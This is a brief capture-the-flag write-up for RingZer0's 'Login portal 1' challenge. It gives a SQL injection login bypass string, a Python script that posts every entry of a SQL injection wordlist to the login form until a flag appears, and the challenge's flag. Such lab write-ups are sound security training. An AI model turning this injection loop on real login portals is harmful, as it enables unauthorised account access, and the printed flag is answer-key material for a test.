<h1>Login portal 1</h1>
<h3>Description</h3>
<p>http://challenges.ringzer0ctf.com:10003/</p>
<h3>Solution</h3>

<p>Injection : <b>admin'or'</b></p>

```python3
import requests

wordlist = open("../Wordlist/SQL.txt",'r')
url = "http://challenges.ringzer0ctf.com:10003/"
for i in wordlist:
    i = i.strip('\n')
    data = {"username":i,"password":i}
    res = requests.post(url,data=data).text
    if "FLAG" in res:
        print(i,res)
        break
```
<h3>Flag</h3>
<pre>
FLAG-4f885o1dal0q1huj6eaxuatcvn
</pre>
